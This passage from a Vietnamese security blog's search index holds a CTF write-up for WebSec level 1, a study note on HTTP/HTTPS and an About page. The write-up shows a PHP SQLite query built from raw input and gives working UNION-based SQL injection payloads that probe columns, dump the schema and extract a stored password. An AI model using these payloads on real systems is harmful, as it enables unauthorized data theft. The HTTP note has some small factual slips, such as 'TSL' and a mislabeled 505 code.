    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level01/index.php">https://websec.fr/level01/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Sau khi nhìn sơ qua bối cảnh challenge, thì có 1 chỗ input là số để xem thông tin ID.<br>Và challenge cũng đã cho source sẵn:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LevelOne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doQuery</span>(<span class="hljs-params"><span class="hljs-variable">$injection</span></span>) </span>&#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br>        <br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="hljs-variable">$injection</span> . <span class="hljs-string">&#x27; LIMIT 1&#x27;</span>;<br>        <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$users</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Với đoạn code trên, tại dòng 5. Nếu như mình truyền vào là dấu ‘, chữ cái, kí tự đặc biệt thì sẽ báo lỗi.</p><p><img src="/img/CTF/WebSec/lv1/image1.png" alt="Lỗi khi nhập chữ a"></p><p>Với source code và thông báo lỗi, mình xác định được đây là lỗi SQL injection trên SQLite3.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>Vì ID kiểu dữ liệu thường là số, nên mình sẽ dùng kỹ thuật khai thác là <a href="https://sechow.com/bricks/docs/content-page-1.html">UNION</a>.</p><ul><li>Kiểm tra số cột được select.</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1 order by 2 ==&gt; OK<br>1 order by 3 ==&gt; ERROR<br></code></pre></td></tr></table></figure><p>Vậy là có 2 cột được select.</p><p>Tiếp theo cần xem các cột đó là gì.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(id <span class="hljs-type">int</span>(<span class="hljs-number">7</span>), username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>), password <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image2.png" alt="Query được dùng"></p><p>Xác định được table là <code>users</code> và các cột là <code>id, username, password</code>.</p><p>Tìm xem còn table nào ngoài users hay không?</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(tbl_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span><span class="hljs-string">&#x27;table&#x27;</span> <span class="hljs-keyword">and</span> tbl_name <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sqlite_%&#x27;</span><br></code></pre></td></tr></table></figure><p>Cuối cùng get flag thôi.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;flag&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image3.png" alt="Flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP⁄HTTPS</title>
    <link href="/2022/07/19/HTTP%E2%81%84HTTPS/"/>
    <url>/2022/07/19/HTTP%E2%81%84HTTPS/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h1><p>Created: June 20, 2021 8:30 AM<br>Status: Complete</p><p><img src="/img/Security/Web/url.png"></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Hypertext Transfer Protocol (giao thức truyền tải siêu văn bản).</p><p>Dùng port: 80</p><p>Giao thức cơ bản dùng cho World Wide Web (www) để truyền dữ liệu dưới dạng văn bản, hình ảnh, âm thanh từ webserver đến các trình duyệt và ngược lại.</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>Hypertext Transfer Protocol Secure.</p><p>Dùng port: 443&#x2F;4433</p><p>Dữ liệu chuyển từ Webserver đến trình duyệt không được mã hóa, dễ bị đánh cắp. Giao thức https dùng SSL (secure sockets layer - lớp cổng bảo mật) để mã hóa dữ liệu giữa website và web browser. Hiện tại SSL không còn được sử dụng nữa, chuyển sang TSL (Transport Security Layer), giống như SSL. </p><p><img src="/img/Security/Web/http.png"></p><h2 id="HTTP-Status-Code"><a href="#HTTP-Status-Code" class="headerlink" title="HTTP Status Code"></a>HTTP Status Code</h2><ul><li>100-199: Information <em>(100: Continue; 101: Switching protocols)</em>.</li><li>200-299: Successes <em>(200 OK is the “normal” response for a GET; 201: Created; 201: Accepted; 203: Non-authoritative information; 204: No content; 205: Reset content; 206: Partial content)</em></li><li>300-399: Redirects <em>(the information you want is elsewhere’ 301: Moved permanently; 302: Moved temporarily; 304: Not modified)</em></li><li>400-499: Client errors <em>(You did something wrong, like asking for something that doesn’t exist; 403: forbidden; 404: not found; 405: Method not allowed; …)</em></li><li>500-599: Server errors <em>(The server tried, but something went wrong on their side; 500: internal server error; 501: Not implemented; 502: Bad gateway; 505: Gateway timeout)</em></li></ul><p><strong>Vi du</strong></p><ul><li>201 Created – Trả về khi một Resouce vừa được tạo thành công.</li><li>204 No Content – Trả về khi Resource xoá thành công.</li><li>304 Not Modified – Client có thể sử dụng dữ liệu cache.</li><li>400 Bad Request – Request không hợp lệ</li><li>401 Unauthorized – Request cần có auth.</li><li>403 Forbidden – bị từ chối không cho phép.</li><li>404 Not Found – Không tìm thấy resource từ URI</li><li>405 Method Not Allowed – Phương thức không cho phép với user hiện tại.</li><li>410 Gone – Resource không còn tồn tại, Version cũ đã không còn hỗ trợ.</li><li>415 Unsupported Media Type – Không hỗ trợ kiểu Resource này.</li><li>422 Unprocessable Entity – Dữ liệu không được xác thực</li><li>429 Too Many Requests – Request bị từ chối do bị giới hạn</li></ul><p><strong>HTTP Request methods (HTTP Verb Tampering)</strong></p><p><strong>GET</strong>: lấy thông tin từ server đã cung cấp từ url. (Các yêu cầu GET ko ảnh hướng đến dữ liệu).</p><p><strong>HEAD</strong>: tương tự GET, nhưng có thêm trạng thái và khu vực Header.</p><p><strong>POST</strong>: yêu cầu gửi dữ liệu đến server. (vd: thông tin khách hàng, file tải lên, ..), sử dụng các thẻ HTML.</p><p><strong>PUT</strong>: thay đổi tất cả các đại diện của nguồn với nội dung được tải lên.</p><p><strong>DELETE</strong>: gỡ bỏ tất cả các đại diện của nguồn bởi URL.</p><p><strong>CONNECT</strong>: thiết lập một tunnel tới server được xác định bởi URl đã cấp.</p><p><strong>OPTIONS</strong>: miêu tả chức năng giao tiếp cho nguồn mục tiêu.</p><p><strong>TRACE</strong>: trình bày vòng lặp kiểm tra thông báo song song với path tới resource.</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>About</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<h2 id="Hi-guys-I’m-a-student-and-a-pentester"><a href="#Hi-guys-I’m-a-student-and-a-pentester" class="headerlink" title="Hi guys, I’m a student and a pentester"></a><p align="center" style="color:#2ECC71"><strong>Hi guys, I’m a student and a pentester</strong></p></h2><hr><p><strong>Email</strong>: <a href="mailto:&#x6b;&#104;&#97;&#x64;&#111;&#x2e;&#x68;&#x63;&#109;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#x6b;&#104;&#97;&#x64;&#111;&#x2e;&#x68;&#x63;&#109;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p><strong>Linkedin</strong>: <a href="https://www.linkedin.com/in/khadv">https://www.linkedin.com/in/khadv</a></p>]]></content>
    
  </entry>
  
  
  
</search>
